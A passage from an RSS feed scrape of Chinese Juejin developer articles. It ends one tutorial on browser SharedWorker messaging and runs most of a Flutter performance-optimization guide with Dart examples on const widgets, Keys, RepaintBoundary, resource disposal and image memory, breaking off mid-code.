<li>同时打开两个页面，在页面A输入消息并点击“广播消息”，两个页面都会收到Worker转发的消息。</li>
<li>点击“发给页面B”，只有页面B会收到消息，实现点对点通讯。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0ca92941294eba87d97406014ae91c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=1UF5PPl%2F2pG4t1Ao%2F1AmoQCgCDg%3D" alt="image.png" loading="lazy"/></p>
<p>页面关闭，自动销毁</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b49f7ef884184332bde92a850938643d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=gkhJqsST35sAFd6YZWLwtxwFeIc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-9">4、SharedWorker的注意事项</h2>
<h3 data-id="heading-10">4.1 同源策略限制严格</h3>
<p>SharedWorker的同源限制比普通Worker更严格：<strong>协议、域名、端口必须完全一致</strong>，即使是子域名（如a.example.com和b.example.com）也无法共享。</p>
<h3 data-id="heading-11">4.2 必须部署才能运行，本地直接打开无效</h3>
<p>由于浏览器的安全限制，直接双击本地HTML文件（file://协议）创建SharedWorker会报错。必须通过HTTP/HTTPS协议部署，本地可使用live-server、http-server等工具启动服务。</p>
<h3 data-id="heading-12">4.3 端口通讯需“双向启动”</h3>
<p>页面端和Worker端的<code>port.start()</code>必须都调用，否则无法正常收发消息。尤其是在使用<code>addEventListener</code>绑定消息事件时，这一步不能省略（若用<code>onmessage</code>属性绑定，部分浏览器会自动启动，但建议统一调用start()）。</p>
<h3 data-id="heading-13">4.4 消息数据需可序列化</h3>
<p>通过port传递的消息数据，必须是可结构化克隆的类型（如对象、数组、字符串等），不能传递函数、DOM元素等不可序列化的数据。若需传递复杂数据，可先转为JSON字符串，接收后再解析。</p>
<h2 data-id="heading-14">5. 总结</h2>
<p>最后总结一下：<code>SharedWorker</code>是一个能被同源多页面共享的后台线程，它通过“单一实例+管理多端口”的模式，实现跨页面通信与数据协同。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《Flutter全栈开发实战指南：从零到高级》- 25 -性能优化]]></title>    <link>https://juejin.cn/post/7584043969687027764</link>    <guid>https://juejin.cn/post/7584043969687027764</guid>    <pubDate>2025-12-16T06:46:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969687027764" data-draft-id="7584013833993519138" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《Flutter全栈开发实战指南：从零到高级》- 25 -性能优化"/> <meta itemprop="keywords" content="Flutter,Android,iOS"/> <meta itemprop="datePublished" content="2025-12-16T06:46:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeap丶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《Flutter全栈开发实战指南：从零到高级》- 25 -性能优化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeap丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:46:07.000Z" title="Tue Dec 16 2025 06:46:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>当用户说某个App用起来很卡时，他们真正抱怨的是什么？
不是CPU使用率，不是内存占用，甚至不是帧率数字。用户感受到的是<code>响应延迟</code>、<code>界面跳帧</code>和<code>操作不跟手</code>。这就是为什么我们要做性能优化——不是为了让数字好看，而是为了让用户感知流畅。</p>
</blockquote>
<p>根据Google的用户体验研究：</p>
<ul>
<li>100ms内响应：用户感觉瞬间完成；</li>
<li>1秒内响应：用户感觉流畅自然；</li>
<li>1-3秒响应：用户开始注意到延迟；</li>
<li>3秒以上响应：用户感到不耐烦，面临卸载的可能；</li>
</ul>
<p>今天，我们将从多个维度，深入理解Flutter性能优化的<strong>是什么</strong>、<strong>为什么</strong>和<strong>怎么做</strong>。</p>
<h3 data-id="heading-1">一、优化构建性能</h3>
<h4 data-id="heading-2">是什么导致了构建性能问题？</h4>
<p>让我们先来看一张构建流程图：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[setState调用] --&gt; B[Widget树重建]
    B --&gt; C[Element树更新]
    C --&gt; D[RenderObject更新]
    D --&gt; E[布局计算]
    E --&gt; F[绘制执行]
    
    G[性能瓶颈来源] --&gt; H[过度重建]
    G --&gt; I[复杂计算]
    G --&gt; J[深度嵌套]
    G --&gt; K[不当的Key使用]
</code></pre>
<h4 data-id="heading-3">优化手段1：const构造函数 - 编译期优化</h4>
<p><strong>是什么</strong>：const构造函数创建的Widget在编译时确定，运行时不会重复构建。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>避免不必要的Widget实例创建</li>
<li>减少垃圾回收压力</li>
<li>提高热重载性能</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 不推荐：每次build都创建新对象</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Container(
    padding: EdgeInsets.all(<span class="hljs-number">16</span>), <span class="hljs-comment">// 每次创建新EdgeInsets</span>
    child: Text(<span class="hljs-string">'标题'</span>, style: TextStyle(fontSize: <span class="hljs-number">18</span>)), <span class="hljs-comment">// 每次创建新TextStyle</span>
  );
}

<span class="hljs-comment">// 优化写法：使用const</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Padding(
    padding: EdgeInsets.all(<span class="hljs-number">16</span>), <span class="hljs-comment">// const EdgeInsets</span>
    child: Text(
      <span class="hljs-string">'标题'</span>,
      style: TextStyle(fontSize: <span class="hljs-number">18</span>),
    ),
  );
}

<span class="hljs-comment">// 推荐：提取常量</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> _padding = EdgeInsets.all(<span class="hljs-number">16</span>);
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> _textStyle = TextStyle(fontSize: <span class="hljs-number">18</span>);
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Padding(
      padding: _padding,
      child: Text(<span class="hljs-string">'标题'</span>, style: _textStyle),
    );
  }
}
</code></pre>
<p><strong>注意点</strong>：</p>
<ul>
<li>const只能用于参数在编译时可确定的Widget</li>
<li>带回调函数的Widget不能使用const</li>
<li>列表中的item使用const效果最明显</li>
</ul>
<h4 data-id="heading-4">优化手段2：Key的正确使用 - 控制Element复用</h4>
<p><strong>是什么</strong>：Key帮助Flutter识别Widget的身份，决定是否复用Element。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>错误的Key导致不必要的Element重建</li>
<li>正确的Key保持状态在Widget移动时不被丢失</li>
</ul>
<p><strong>如何选择Key类型？</strong></p>



































<table><thead><tr><th>Key类型</th><th>适用场景</th><th>注意点</th></tr></thead><tbody><tr><td>ValueKey</td><td>基于值的唯一标识</td><td>值变化时状态重置</td></tr><tr><td>ObjectKey</td><td>基于对象的唯一标识</td><td>适合对象列表</td></tr><tr><td>UniqueKey</td><td>绝对唯一标识</td><td>每次重建都不同</td></tr><tr><td>GlobalKey</td><td>全局唯一标识</td><td>谨慎使用，性能开销大</td></tr><tr><td>PageStorageKey</td><td>保持滚动位置</td><td>用于可滚动列表</td></tr></tbody></table>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyOptimizationDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _KeyOptimizationDemoState createState() =&gt; _KeyOptimizationDemoState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_KeyOptimizationDemoState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">KeyOptimizationDemo</span>&gt; </span>{
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt; items = [<span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>];
  
  <span class="hljs-keyword">void</span> _reverseList() {
    setState(() {
      items = items.reversed.toList();
    });
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        ElevatedButton(
          onPressed: _reverseList,
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'反转列表'</span>),
        ),
        Expanded(
          child: ListView.builder(
            itemCount: items.length,
            itemBuilder: (context, index) {
              <span class="hljs-keyword">final</span> item = items[index];
              
              <span class="hljs-comment">// 情况1：没有Key - 反转时状态会错乱</span>
              <span class="hljs-comment">// return StatefulListItem(text: item);</span>
              
              <span class="hljs-comment">// 情况2：使用index作为Key - 反转时状态错乱</span>
              <span class="hljs-comment">// return StatefulListItem(key: ValueKey(index), text: item);</span>
              
              <span class="hljs-comment">// 情况3：使用ValueKey - 反转时状态保持正确</span>
              <span class="hljs-keyword">return</span> StatefulListItem(key: ValueKey(item), text: item);
            },
          ),
        ),
      ],
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StatefulListItem</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> text;
  
  <span class="hljs-keyword">const</span> StatefulListItem({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.text}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _StatefulListItemState createState() =&gt; _StatefulListItemState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_StatefulListItemState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">StatefulListItem</span>&gt; </span>{
  <span class="hljs-built_in">int</span> _counter = <span class="hljs-number">0</span>;
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ListTile(
      title: Text(<span class="hljs-string">'<span class="hljs-subst">${widget.text}</span> - 点击次数: <span class="hljs-subst">$_counter</span>'</span>),
      onTap: () =&gt; setState(() =&gt; _counter++),
    );
  }
}
</code></pre>
<h4 data-id="heading-5">优化手段3：RepaintBoundary - 隔离重绘区域</h4>
<p><strong>是什么</strong>：创建一个独立的绘制图层，避免不必要的重绘。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>频繁变化的组件不影响静态区域</li>
<li>减少整体重绘范围</li>
<li>提高渲染效率</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>频繁动画的组件</li>
<li>独立滚动的列表</li>
<li>视频播放器</li>
<li>游戏画布</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RepaintBoundaryDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      body: Column(
        children: [
          <span class="hljs-comment">// 静态区域，不需要重绘边界</span>
          <span class="hljs-keyword">const</span> StaticHeader(),
          
          <span class="hljs-comment">// 频繁动画区域，需要隔离</span>
          RepaintBoundary(
            child: AnimatedClock(),
          ),
          
          <span class="hljs-comment">// 静态区域</span>
          <span class="hljs-keyword">const</span> StaticContent(),
          
          <span class="hljs-comment">// 独立滚动的列表</span>
          Expanded(
            child: RepaintBoundary(
              child: ProductList(),
            ),
          ),
        ],
      ),
    );
  }
}
</code></pre>
<p><strong>注意点</strong>：</p>
<ul>
<li>每个RepaintBoundary都有内存和性能开销</li>
<li>不要过度使用，特别是在深度嵌套中</li>
<li>优先隔离频繁变化的小区域</li>
</ul>
<h4 data-id="heading-6">优化手段4：didUpdateWidget - 严格控制更新</h4>
<p><strong>是什么</strong>：StatefulWidget更新时的回调，可以精确控制哪些变化需要重建。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>避免不必要的setState调用</li>
<li>可以只更新真正变化的部分</li>
<li>减少重建范围</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmartWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> title;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; data;
  
  <span class="hljs-keyword">const</span> SmartWidget({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.title, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.data})
      : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _SmartWidgetState createState() =&gt; _SmartWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SmartWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SmartWidget</span>&gt; </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-built_in">String</span> _currentTitle;
  <span class="hljs-keyword">late</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; _currentData;
  <span class="hljs-built_in">String?</span> _computedResult;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _currentTitle = widget.title;
    _currentData = widget.data;
    _computeResult();
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(SmartWidget oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    
    <span class="hljs-comment">// 只有title变化时才重建UI</span>
    <span class="hljs-keyword">if</span> (widget.title != _currentTitle) {
      _currentTitle = widget.title;
      setState(() {});
    }
    
    <span class="hljs-comment">// data变化时重新计算，但不一定需要重建UI</span>
    <span class="hljs-keyword">if</span> (!_listEquals(widget.data, _currentData)) {
      _currentData = widget.data;
      _computeResult();
      <span class="hljs-comment">// 这里不调用setState，因为_computedResult可能被其他Widget使用</span>
    }
  }
  
  <span class="hljs-keyword">void</span> _computeResult() {
    _computedResult = <span class="hljs-string">'计算结果: <span class="hljs-subst">${widget.data.length}</span>'</span>;
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Container(
      child: Column(
        children: [
          Text(_currentTitle),
          <span class="hljs-keyword">if</span> (_computedResult != <span class="hljs-keyword">null</span>) Text(_computedResult!),
        ],
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-7">二、优化内存</h3>
<h4 data-id="heading-8">Flutter内存泄漏的根源？</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[内存泄漏] --&gt; B[未释放的订阅]
    A --&gt; C[未取消的Timer]
    A --&gt; D[未dispose的Controller]
    A --&gt; E[循环引用]
    A --&gt; F[大对象未及时释放]
    
    G[泄漏影响] --&gt; H[内存持续增长]
    G --&gt; I[OOM崩溃]
    G --&gt; J[应用被系统终止]
    G --&gt; K[用户体验差]
</code></pre>
<h4 data-id="heading-9">优化手段1：管理资源生命周期</h4>
<p><strong>是什么</strong>：确保所有需要手动释放的资源都被正确释放。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>Dart有垃圾回收，但某些资源需要手动管理</li>
<li>未释放的资源会导致内存泄漏</li>
<li>订阅和监听器可能持有Widget引用</li>
</ul>
<p><strong>需要管理的资源类型</strong>：</p>
<ol>
<li>StreamSubscription</li>
<li>Timer</li>
<li>ScrollController/TextEditingController</li>
<li>AnimationController</li>
<li>FocusNode</li>
<li>ImageStream</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 典型的内存泄漏</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeakyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _LeakyWidgetState createState() =&gt; _LeakyWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LeakyWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LeakyWidget</span>&gt; </span>{
  StreamSubscription? _subscription;
  Timer? _timer;
  ScrollController _controller = ScrollController();
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    <span class="hljs-comment">// 订阅Stream</span>
    _subscription = Stream.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>))
        .listen((_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'tick'</span>));
    
    <span class="hljs-comment">// 启动Timer</span>
    _timer = Timer.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>), (_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'timer'</span>));
    
    <span class="hljs-comment">// 添加监听器</span>
    _controller.addListener(() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'scrolling'</span>));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// 忘记取消和释放</span>
    <span class="hljs-comment">// _subscription?.cancel();</span>
    <span class="hljs-comment">// _timer?.cancel();</span>
    <span class="hljs-comment">// _controller.dispose();</span>
    
    <span class="hljs-keyword">super</span>.dispose();
  }
}

<span class="hljs-comment">// 正确做法：</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SafeWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _SafeWidgetState createState() =&gt; _SafeWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SafeWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SafeWidget</span>&gt; </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> StreamSubscription _subscription;
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> Timer _timer;
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> ScrollController _controller;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    _controller = ScrollController();
    _controller.addListener(_onScroll);
    
    _subscription = Stream.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>))
        .listen(_onTick);
    
    _timer = Timer.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>), _onTimer);
  }
  
  <span class="hljs-keyword">void</span> _onTick(_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'tick'</span>);
  <span class="hljs-keyword">void</span> _onTimer(_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'timer'</span>);
  <span class="hljs-keyword">void</span> _onScroll() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'scrolling'</span>);
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// 按创建顺序的逆序释放</span>
    _timer.cancel();
    _subscription.cancel();
    _controller.dispose();
    
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h4 data-id="heading-10">优化手段2：大对象管理</h4>
<p><strong>是什么</strong>：针对图像、列表等大内存对象进行特殊管理。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>图像是移动应用内存的最大占用者</li>
<li>不当的图像加载会导致OOM</li>
<li>列表数据可能占用大量内存</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>图像压缩和缓存</li>
<li>列表分页加载</li>
<li>对象池复用</li>
<li>懒加载和预加载平衡</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 优化图像内存</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageMemoryOptimizer</span> </span>{
  <span class="hljs-comment">// 1. 使用正确的图像尺寸</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedImage(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> Image.network(
      url,
      width: <span class="hljs-number">100</span>,  
      height: <span class="hljs-number">100</span>,
      fit: BoxFit.cover,
      cacheWidth: <span class="hljs-number">200</span>,  
      cacheHeight: <span class="hljs-number">200</span>,
    );
  }
  
  <span class="hljs-comment">// 2. 使用缓存策略</span>
  <span class="hljs-keyword">static</span> Widget buildCachedImage(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> CachedNetworkImage(
      imageUrl: url,
      placeholder: (context, url) =&gt; CircularProgressIndicator(),
      errorWidget: (context, url, error) =&gt; Icon(Icons.error),
      width: <span class="hljs-number">100</span>,
      height: <span class="hljs-number">100</span>,
      fit: BoxFit.cover,
      memCacheWidth: <span class="hljs-number">200</span>,  
      memCacheHeight: <span class="hljs-number">200</span>,
      maxWidthDiskCache: <span class="hljs-number">400</span>,  
      maxHeightDiskCache: <span class="hljs-number">400</span>,
    );
  }
  
  <span class="hljs-comment">// 3. 管理图片预加载</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, ImageProvider&gt; _preloadedImages = {};
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; preloadImage(<span class="hljs-built_in">String</span> url) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_preloadedImages.containsKey(url)) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">final</span> completer = Completer&lt;<span class="hljs-keyword">void</span>&gt;();
    <span class="hljs-keyword">final</span> imageProvider = NetworkImage(url);
    
    <span class="hljs-comment">// 预加载到缓存</span>
    <span class="hljs-keyword">final</span> stream = imageProvider.resolve(ImageConfiguration.empty);
    <span class="hljs-keyword">final</span> listener = ImageStreamListener((info, <span class="hljs-keyword">sync</span>) {
      _preloadedImages[url] = imageProvider;
      completer.complete();
    });
    
    stream.addListener(listener);
    <span class="hljs-keyword">await</span> completer.future;
    stream.removeListener(listener);
  }
}

<span class="hljs-comment">// 优化列表内存</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListMemoryOptimizer</span> </span>{
  <span class="hljs-comment">// 1. 分页加载</span>
